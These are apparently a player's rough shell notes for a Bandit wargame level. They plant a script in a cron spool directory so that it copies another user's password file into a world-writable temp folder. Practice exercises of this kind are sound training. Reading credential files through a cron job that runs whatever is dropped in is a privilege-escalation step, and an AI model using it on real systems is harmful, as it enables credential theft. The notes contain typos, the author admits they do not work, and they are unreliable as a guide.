cat /usr/bin/cronjob_bandit24.sh

mktemp -d
cd tmp/tmp.xxx
nano script.sh
<<###
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.xxx/pw
###

touch script.sh
chmod 777 script.sh
chmod 777 /tmp/tmp.xxx
touch pw
chmod 666 pw

cp script.sh /var/spool/bandit24/foo/scrip.sh

cat pw #Sol but still stuck on this xdd cant read naothiuagsasuoih
